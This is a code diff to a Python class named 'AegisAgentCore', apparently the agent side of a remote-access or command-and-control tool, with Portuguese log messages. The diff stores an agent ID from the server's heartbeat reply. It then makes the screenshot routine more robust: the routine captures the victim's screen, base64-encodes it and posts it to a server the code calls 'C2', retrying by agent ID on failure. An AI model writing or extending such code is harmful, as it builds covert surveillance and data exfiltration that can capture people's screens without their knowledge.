@@ -51,7 +51,8 @@ class AegisAgentCore:
             resp = self.session.post(url, json=payload, timeout=5)
             if resp.status_code == 200:
                 data = resp.json()
-                self.log_gui("Heartbeat enviado com sucesso.")
+                self.agent_id = data.get("agent_id")
+                self.log_gui(f"Heartbeat enviado (AgentID: {self.agent_id})")
                 return data
             else:
                 self.log_gui(f"Falha heartbeat HTTP {resp.status_code}")
@@ -174,9 +175,23 @@ class AegisAgentCore:
 
     def send_screenshot(self):
         b64 = take_screenshot()
-        if b64:
-            try:
-                self.session.post(f"{self.server_url}/api/screenshot/{self.original_hostname}", json={"screenshot_b64": b64}, timeout=10)
-                self.log_gui("Screenshot enviado ao C2.")
-            except Exception as e:
-                self.log_gui(f"Erro envio print: {e}")
+        if not b64:
+            self.log_gui("⚠️ Falha ao capturar screenshot (Pillow não instalado ou erro de sistema).")
+            return
+
+        url = f"{self.server_url}/api/screenshot/{self.original_hostname}"
+        try:
+            r = self.session.post(url, json={"screenshot_b64": b64}, timeout=15)
+            if r.status_code == 200:
+                self.log_gui("✅ Screenshot enviado e processado pelo C2.")
+            else:
+                self.log_gui(f"❌ Erro ao enviar screenshot: C2 retornou HTTP {r.status_code}")
+                # Fallback: tentar enviar por ID se o C2 retornou erro
+                agent_id = getattr(self, 'agent_id', None)
+                if agent_id:
+                    fallback_url = f"{self.server_url}/api/screenshot/{agent_id}"
+                    r2 = self.session.post(fallback_url, json={"screenshot_b64": b64}, timeout=15)
+                    if r2.status_code == 200:
+                        self.log_gui("✅ Screenshot enviado via ID (Fallback).")
+        except Exception as e:
+            self.log_gui(f"💥 Erro de conexão ao enviar print: {e}")
